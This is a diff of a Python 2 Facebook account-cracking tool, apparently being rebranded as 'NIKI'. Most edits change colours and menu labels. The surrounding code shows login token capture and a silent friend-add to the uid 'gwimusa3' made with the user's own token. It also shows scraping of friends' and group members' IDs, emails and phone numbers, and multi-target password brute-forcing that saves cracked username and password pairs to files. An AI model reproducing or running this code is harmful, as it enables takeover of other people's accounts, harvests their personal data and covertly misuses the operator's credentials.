@@ -69,9 +69,9 @@ logo = """
 \033[1;92m╚══0═══0═════00o═══════════════════════════╝
 \033[1;92m   
 \033[1;92m╔══o00════════00o═════════════════════════╗
-\033[1;91m║            PUBLIC ID CLONER           ║
+\033[1;91m║            PUBLIC ID CLONER             ║
 \033[1;92m╚═════════════════════════════════════════╝
-\033[1;96m-----------------------------------------------"""
+\033[1;91m-------------------------------------------"""
 
 # titik #
 def tik():
@@ -113,11 +113,11 @@ def lisensi():
 def masuk():
 	os.system('reset')
 	print logo
-	print "\033[1;92m║--\033[1;91m> \033[1;95m[1]\033[1;92m Login dulu"
-	print "\033[1;92m║--\033[1;91m> \033[1;95m[2]\033[1;92m Login using token"
-	print "\033[1;92m║--\033[1;91m> \033[1;95m[0]\033[1;92m Exit/keluar"
+	print "\033[1;92m║--\033[1;91m> \033[1;96m[1]\033[1;92m LOGIN AGO"
+	print "\033[1;92m║--\033[1;91m> \033[1;96m[2]\033[1;92m LOGIN USING TOKRN"
+	print "\033[1;92m║--\033[1;91m> \033[1;96m[0]\033[1;92m BACK"
 	print "\033[1;92m║"
-	msuk = raw_input("\033[1;91m╚═\033[1;1mD \033[1;93m")
+	msuk = raw_input("\033[1;92m╚═\033[1;91mD \033[1;92m")
 	if msuk =="":
 		print"\033[1;91m[!] Wrong input"
 		keluar()
@@ -141,9 +141,9 @@ def login():
 	except (KeyError,IOError):
 		os.system('reset')
 		print logo
-		print('\033[1;96m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
-		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
-		pwd = getpass.getpass('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ')
+		print('\033[1;91m[☆] \033[1;92mLOGIN FACEBOOK ID \033[1;91m[☆]')
+		id = raw_input('\033[1;91m[+] \033[1;92mID\033[1;97m|\033[1;92mEmail\033[1;97m \033[1;91m:\033[1;92m ')
+		pwd = getpass.getpass('\033[1;91m[+] \033[1;92mPassword \033[1;93m:\033[1;95m ')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -170,15 +170,15 @@ def login():
 				zedd = open("login.txt", 'w')
 				zedd.write(z['access_token'])
 				zedd.close()
-				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
+				print '\n\033[1;91m[\033[1;92m✓\033[1;91m] \033[1;92mLogin successfully'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.pashakun.com')
+				os.system('xdg-open https://www.facebook.com/NIKI.CYBER404.OFFICIALS')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;91m[!] No connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
+			print("\n\033[1;92m[!] \033[1;92mAccount Checkpoint")
 			print("\n\033[1;92m[#] Harap Login Ulang !")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
@@ -230,7 +230,7 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('reset')
-		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
+		print"\033[1;91m[!] \033[1;92mAccount Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -239,18 +239,18 @@ def menu():
 		keluar()
 	os.system("reset")
 	print logo
-	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m"
-	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
+	print "║\033[1;91m[\033[1;92m✓\033[1;91m]\033[1;92m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m"
+	print "║\033[1;91m[\033[1;92m✓\033[1;91m]\033[1;92m ID   \033[1;91m: \033[1;92m"+id
 	print "\033[1;97m╚"+40*"═"
-	print "\033[1;94m║--\033[1;91m> \033[1;93m1.\033[1;95m User information"
-	print "\033[1;94m║--\033[1;91m> \033[1;93m2.\033[1;95m Get Id/email/hp"
-	print "\033[1;94m║--\033[1;91m> \033[1;93m3.\033[1;95m Hack facebook account               "
-	print "\033[1;94m║--\033[1;91m> \033[1;93m4.\033[1;95m Bot       "
-	print "\033[1;94m║--\033[1;91m> \033[1;93m5.\033[1;95m Others           "
-	print "\033[1;94m║--\033[1;91m> \033[1;93m6.\033[1;95m Show token           "
-	print "\033[1;94m║--\033[1;91m> \033[1;93m7.\033[1;95m Delete trash          "
-	print "\033[1;94m║--\033[1;91m> \033[1;93m8.\033[1;95m LogOut            "
-	print "\033[1;94m║--\033[1;91m> \033[1;93m0.\033[1;95m Exit the programs          "
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[1]\033[1;92m USER INFORMATION"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[2]\033[1;92m CRACK ID/Email/PH"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[3]\033[1;92m HACK FAECBOOK ID               "
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[4]\033[1;92m BOT       "
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[5]\033[1;92m OTHERS           "
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[6]\033[1;92m SHOW TOKEN           "
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[7]\033[1;92m DELETE TRASH          "
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[8]\033[1;92m LOGOUT            "
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[0]\033[1;92m BACK           "
 	print "║"
 	pilih()
 #-
@@ -355,22 +355,22 @@ def dump():
 		login()
 	os.system('reset')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get ID friend from friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Get ID Search"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Get group member ID"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Get group member email"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Get group member phone number"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Get email friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Get email friend from friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Get a friend's phone number"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m10.\033[1;97m Get a friend's phone number from friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[1]\033[1;92m Crack ID friend"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[2]\033[1;92m Carck ID friend from friend"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[3]\033[1;92m Crack ID Search"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[4]\033[1;92m Crack group member ID"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[5]\033[1;92m Crack group member email"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[6]\033[1;92m Crack group member phone number"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[7]\033[1;92m Crack email friend"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[8]\033[1;92m Carck email friend from friend"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[9]\033[1;92m Crack a friend's phone number"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[10]\033[1;92m Crack a friend's phone number from friend"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[0]\033[1;92m Back"
 	print "║"
 	dump_pilih()
 #-----pilih
 def dump_pilih():
-	cuih = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	cuih = raw_input("\033[1;94m╚═\033[1;91mD \033[1;92m")
 	if cuih =="":
 		print "\033[1;91m[!] Wrong input"
 		dump_pilih()
@@ -951,17 +951,17 @@ def menu_hack():
 		login()
 	os.system('reset')
 	print logo
-	print "\033[1;93m║--\033[1;93m> \033[1;93m1.\033[1;94m Mini Hack Facebook(\033[1;92mTarget\033[1;97m)"
-	print "\033[1;93m║--\033[1;93m> \033[1;93m2.\033[1;94m Multi Bruteforce Facebook"
-	print "\033[1;93m║--\033[1;93m> \033[1;93m3.\033[1;94m Super Multi Bruteforce Facebook"
-	print "\033[1;93m║--\033[1;93m> \033[1;93m4.\033[1;94m BruteForce(\033[1;92mTarget\033[1;97m)"
-	print "\033[1;93m║--\033[1;93m> \033[1;93m5.\033[1;94m Yahoo Checker"
-	print "\033[1;93m║--\033[1;93m> \033[1;93m0.\033[1;94m Back"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[1]\033[1;92m Mini Hack Facebook(\033[1;92mTarget\033[1;97m)"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[2]\033[1;92m Multi Bruteforce Facebook"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[3]\033[1;92m Super Multi Bruteforce Facebook"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[4]\033[1;92m BruteForce(\033[1;92mTarget\033[1;97m)"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[5]\033[1;92m Yahoo Checker"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[0]\033[1;92m Back"
 	print "║"
 	hack_pilih()
 #----pilih
 def hack_pilih():
-	hack = raw_input("\033[1;95m╚═\033[1;95mD \033[1;95m")
+	hack = raw_input("\033[1;94m╚═\033[1;92mD \033[1;95m")
 	if hack=="":
 		print "\033[1;91m[!] Wrong input"
 		hack_pilih()
@@ -1033,8 +1033,8 @@ def mini():
 				if 'access_token' in y:
 					print "\033[1;91m[+] \033[1;92mFound"
 					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
+					print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+					print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz2
 					raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 					menu_hack()
 				else:
@@ -1042,8 +1042,8 @@ def mini():
 						print "\033[1;91m[+] \033[1;92mFound"
 						print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
 						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
+						print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+						print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz2
 						raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 						menu_hack()
 					else:
@@ -1053,17 +1053,17 @@ def mini():
 						if 'access_token' in y:
 							print "\033[1;91m[+] \033[1;92mFound"
 							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
-							raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+							print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+							print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz3
+							raw_input("\n\033[1;91m[ \033[1;92mBack \033[1;91m]")
 							menu_hack()
 						else:
 							if 'www.facebook.com' in y["error_msg"]:
 								print "\033[1;91m[+] \033[1;92mFound"
 								print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
 								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
+								print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+								print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz3
 								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 								menu_hack()
 							else:
@@ -1074,8 +1074,8 @@ def mini():
 								if 'access_token' in y:
 									print "\033[1;91m[+] \033[1;92mFound"
 									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
+									print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+									print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz4
 									raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 									menu_hack()
 								else:
@@ -1083,8 +1083,8 @@ def mini():
 										print "\033[1;91m[+] \033[1;92mFound"
 										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
 										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
+										print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+										print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz4
 										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 										menu_hack()
 									else:
@@ -1096,8 +1096,8 @@ def mini():
 										if 'access_token' in y:
 											print "\033[1;91m[+] \033[1;92mFound"
 											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
+											print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+											print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz5
 											raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 											menu_hack()
 										else:
@@ -1105,8 +1105,8 @@ def mini():
 												print "\033[1;91m[+] \033[1;92mFound"
 												print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
 												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
+												print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+												print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz5
 												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 												menu_hack()
 											else:
@@ -1116,8 +1116,8 @@ def mini():
 												if 'access_token' in y:
 													print "\033[1;91m[+] \033[1;92mFound"
 													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
+													print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+													print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz6
 													raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 													menu_hack()
 												else:
@@ -1125,8 +1125,8 @@ def mini():
 														print "\033[1;91m[+] \033[1;92mFound"
 														print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
 														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
+														print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+														print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz6
 														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 														menu_hack()
 													else:
@@ -1136,8 +1136,8 @@ def mini():
 														if 'access_token' in y:
 															print "\033[1;91m[+] \033[1;92mFound"
 															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
+															print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+															print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz7
 															raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 															menu_hack()
 														else:
@@ -1145,8 +1145,8 @@ def mini():
 																print "\033[1;91m[+] \033[1;92mFound"
 																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
 																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
-																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
+																print "\033[1;91m[➹] \033[1;92mNIKI-USER\033[1;97m : "+id
+																print "\033[1;91m[➹] \033[1;92mNIKI-PASS\033[1;97m : "+pz6
 																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 																menu_hack()
 															else:
@@ -1212,12 +1212,12 @@ def scrak():
 				bisa.close()
 				x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
 				z = json.loads(x.text)
-				berhasil.append("\033[1;97m[ \033[1;92mOK✓\033[1;97m ] "+username+"|" +passw+" =>"+z['name'])
+				berhasil.append("\033[1;97m[ \033[1;92mNIKI-OK✓\033[1;97m ] "+username+"|" +passw+" =>"+z['name'])
 			elif 'www.facebook.com' in mpsh["error_msg"]:
 				cek = open("out/mbf_cp.txt", "w")
 				cek.write(username+"|"+passw+"\n")
 				cek.close()
-				cekpoint.append("\033[1;97m[ \033[1;93mCP✚\033[1;97m ] "+username+"|" +passw)
+				cekpoint.append("\033[1;97m[ \033[1;93mNIKI-CP✚\033[1;97m ] "+username+"|" +passw)
 			else:
 				gagal.append(username)
 				back +=1
@@ -1255,15 +1255,15 @@ def super():
 		login()
 	os.system('reset')
 	print logo
-	print "\033[1;95m║--\033[1;91m> \033[1;96m1.\033[1;93m Crack with list friend"
-	print "\033[1;95m║--\033[1;91m> \033[1;96m2.\033[1;93m Crack from friend"
-	print "\033[1;95m║--\033[1;91m> \033[1;96m3.\033[1;93m Crack from member group"
-	print "\033[1;95m║--\033[1;91m> \033[1;96m0.\033[1;93m Back"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[1]\033[1;92m Crack with list friend"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[2]\033[1;92m Crack from friend"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[3]\033[1;92m Crack from member group"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[0]\033[1;92m Back"
 	print "║"
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	peak = raw_input("\033[1;94m╚═\033[1;92mD \033[1;97m")
 	if peak =="":
 		print "\033[1;91m[!] Wrong input"
 		pilih_super()
@@ -1342,7 +1342,7 @@ def pilih_super():
 			if 'access_token' in q:
 				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				z = json.loads(x.text)
-				print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass1+" =>"+z['name'])
+				print("\033[1;93m[ \033[1;93mNIKI-OK✓\033[1;93m ] "+user+" 😁 " +pass1+" =>"+z['name'])
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
@@ -1358,7 +1358,7 @@ def pilih_super():
 					if 'access_token' in q:
 						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 						z = json.loads(x.text)
-						print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass2+" =>"+z['name'])
+						print("\033[1;93m[ \033[1;93mNIKI-OK✓\033[1;93m ] "+user+" 😁 " +pass2+" =>"+z['name'])
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
@@ -1374,7 +1374,7 @@ def pilih_super():
 							if 'access_token' in q:
 								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 								z = json.loads(x.text)
-								print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass3+" =>"+z['name'])
+								print("\033[1;93m[ \033[1;93mNIKI-OK✓\033[1;93m ] "+user+" 😁 " +pass3+" =>"+z['name'])
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
@@ -1391,7 +1391,7 @@ def pilih_super():
 									if 'access_token' in q:
 										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 										z = json.loads(x.text)
-										print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass4+" =>"+z['name'])
+										print("\033[1;93m[ \033[1;93mNIKI-OK✓\033[1;93m ] "+user+" 😁 " +pass4+" =>"+z['name'])
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
@@ -1407,7 +1407,7 @@ def pilih_super():
 											if 'access_token' in q:
 												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 												z = json.loads(x.text)
-												print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass5+" =>"+z['name'])
+												print("\033[1;93m[ \033[1;93mNIKI-OK✓\033[1;93m ] "+user+" 😁 " +pass5+" =>"+z['name'])
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
@@ -1423,7 +1423,7 @@ def pilih_super():
 													if 'access_token' in q:
 														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 														z = json.loads(x.text)
-														print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass6+" =>"+z['name'])
+														print("\033[1;93m[ \033[1;93mNIKI-OK✓\033[1;93m ] "+user+" 😁 " +pass6+" =>"+z['name'])
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
@@ -1441,7 +1441,7 @@ def pilih_super():
 															if 'access_token' in q:
 																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 																z = json.loads(x.text)
-																print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass7+" =>"+z['name'])
+																print("\033[1;93m[ \033[1;93mNIKI-OK✓\033[1;93m ] "+user+" 😁 " +pass7+" =>"+z['name'])
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
@@ -1478,8 +1478,8 @@ def brute():
 	os.system('reset')
 	print logo
 	try:
-		email = raw_input("\033[1;91m[+] \033[1;92mID\033[1;97m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
-		passw = raw_input("\033[1;91m[+] \033[1;92mWordlist \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
+		email = raw_input("\033[1;91m[+] \033[1;92mID\033[1;92m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
+		passw = raw_input("\033[1;91m[+] \033[1;92mWordlist \033[1;92mext(list.txt) \033[1;91m: \033[1;97m")
 		total = open(passw,"r")
 		total = total.readlines()
 		print 42*"\033[1;97m═"
@@ -1500,8 +1500,8 @@ def brute():
 					dapat.close()
 					print "\n\033[1;91m[+] \033[1;92mFound"
 					print 42*"\033[1;97m═"
-					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
-					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
+					print("\033[1;91m[➹] \033[1;92mNIKI-USER \033[1;91m:\033[1;97m "+email)
+					print("\033[1;91m[➹] \033[1;92mNIKI-PASS \033[1;91m:\033[1;97m "+pw)
 					keluar()
 				elif 'www.facebook.com' in mpsh["error_msg"]:
 					ceks = open("Brutecekpoint.txt", "w")
@@ -1510,8 +1510,8 @@ def brute():
 					print "\n\033[1;91m[+] \033[1;92mFound"
 					print 42*"\033[1;97m═"
 					print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
-					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
-					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
+					print("\033[1;91m[➹] \033[1;92mNIKI-USER \033[1;91m:\033[1;97m "+email)
+					print("\033[1;91m[➹] \033[1;92mNIKI-PASS \033[1;91m:\033[1;97m "+pw)
 					keluar()
 			except requests.exceptions.ConnectionError:
 				print"\033[1;91m[!] Connection Error"
@@ -1550,16 +1550,16 @@ def menu_yahoo():
 		login()
 	os.system('reset')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m With list friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Clone from friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Clone from member group"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Using file"
-	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[1]\033[1;97m With list friend"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[2]\033[1;97m Clone from friend"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[3]\033[1;97m Clone from member group"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[4]\033[1;97m Using file"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[0]\033[1;97m Back"
 	print "║"
 	yahoo_pilih()
 #----pilih
 def yahoo_pilih():
-	go = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	go = raw_input("\033[1;94m╚═\033[1;92mD \033[1;97m")
 	if go =="":
 		print "\033[1;91m[!] Wrong"
 		yahoo_pilih()
@@ -1853,19 +1853,19 @@ def menu_bot():
 		login()
 	os.system('reset')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Bot Reactions Target Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Bot Reactions Grup Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Bot Komen Target Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Bot Komen Grup Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Mass delete Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Mass accept friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Mass delete friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[1]\033[1;92m Bot Reactions Target Post"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[2]\033[1;92m Bot Reactions Grup Post"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[3]\033[1;92m Bot Komen Target Post"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[4]\033[1;92m Bot Komen Grup Post"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[5]\033[1;92m Mass delete Post"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[6]\033[1;92m Mass accept friend"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[7]\033[1;92m Mass delete friend"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[0]\033[1;92m Back"
 	print "║"
 	bot_pilih()
 #////////////
 def bot_pilih():
-	bots = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	bots = raw_input("\033[1;94m╚═\033[1;92mD \033[1;97m")
 	if bots =="":
 		print "\033[1;91m[!] Wrong input"
 		bot_pilih()
@@ -1901,19 +1901,19 @@ def menu_react():
 		login()
 	os.system('reset')
 	print logo
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
-	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print ("\033[1;94m║--\033[1;92m> \033[1;92m[1]\033[1;92mLike")
+	print ("\033[1;94m║--\033[1;92m> \033[1;92m[2]\033[1;92mLove")
+	print ("\033[1;94m║--\033[1;92m> \033[1;92m[3]\033[1;92mWow")
+	print ("\033[1;94m║--\033[1;92m> \033[1;91m[4]\033[1;92mHaha")
+	print ("\033[1;94m║--\033[1;92m> \033[1;91m[5]\033[1;93mSadBoy")
